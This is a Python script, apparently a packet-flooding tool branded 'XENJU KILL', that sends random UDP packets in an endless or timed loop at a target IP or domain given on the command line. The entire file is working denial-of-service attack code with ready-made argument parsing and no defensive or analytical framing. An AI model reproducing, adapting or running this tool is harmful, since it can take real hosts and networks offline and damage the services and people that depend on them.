# -*- coding: utf-8 -*-
from time import time as tt
import argparse
import socket
import random
import os

method = """\033[32m
───────────────────────────────────────────────────────────────────────────────────────
─████████──████████─██████████████─██████──────────██████─────────██████─██████──██████
─██▒▒▒▒██──██▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██████████──██▒▒██─────────██▒▒██─██▒▒██──██▒▒██
─████▒▒██──██▒▒████─██▒▒██████████─██▒▒▒▒▒▒▒▒▒▒██──██▒▒██─────────██▒▒██─██▒▒██──██▒▒██
───██▒▒▒▒██▒▒▒▒██───██▒▒██─────────██▒▒██████▒▒██──██▒▒██─────────██▒▒██─██▒▒██──██▒▒██
───████▒▒▒▒▒▒████───██▒▒██████████─██▒▒██──██▒▒██──██▒▒██─────────██▒▒██─██▒▒██──██▒▒██
─────██▒▒▒▒▒▒██─────██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██▒▒██──██▒▒██─────────██▒▒██─██▒▒██──██▒▒██
───████▒▒▒▒▒▒████───██▒▒██████████─██▒▒██──██▒▒██──██▒▒██─██████──██▒▒██─██▒▒██──██▒▒██
───██▒▒▒▒██▒▒▒▒██───██▒▒██─────────██▒▒██──██▒▒██████▒▒██─██▒▒██──██▒▒██─██▒▒██──██▒▒██
─████▒▒██──██▒▒████─██▒▒██████████─██▒▒██──██▒▒▒▒▒▒▒▒▒▒██─██▒▒██████▒▒██─██▒▒██████▒▒██
─██▒▒▒▒██──██▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒██──██████████▒▒██─██▒▒▒▒▒▒▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒██
─████████──████████─██████████████─██████──────────██████─██████████████─██████████████
───────────────────────────────────────────────────────────────────────────────────────
"""

os.system("clear")
def attack(ip, port, time, size):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(method)
    print("\033[95m-------->XENJU KILL")
    fmt = '\033[91mXENJU KILL {ip} {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    size = os.urandom(min(666,1024,102400,1203425,20179,999,362436,6048,4095,4096,1180,65500,15000,1021, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)
        endtime = tt()
        if startup + time < endtime:
            break
        sock.sendto(size, (ip, port))

    print('\033[92mAttack Finished')
    return

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Usage: python obf.py <ip> <port> <time> <size>')

    parser.add_argument('ip', type=str, help='IP or domain to attack.')
    parser.add_argument('-p', '--port', type=int, default=None, help='Port number.')
    parser.add_argument('-t', '--time', type=int, default=None, help='Time in seconds.')
    parser.add_argument('-s', '--size', type=int, default=1024, help='Size in bytes.')

    args = parser.parse_args()

    try:
        attack(args.ip, args.port, args.time, args.size)
    except KeyboardInterrupt:
        print('Attack stopped.')
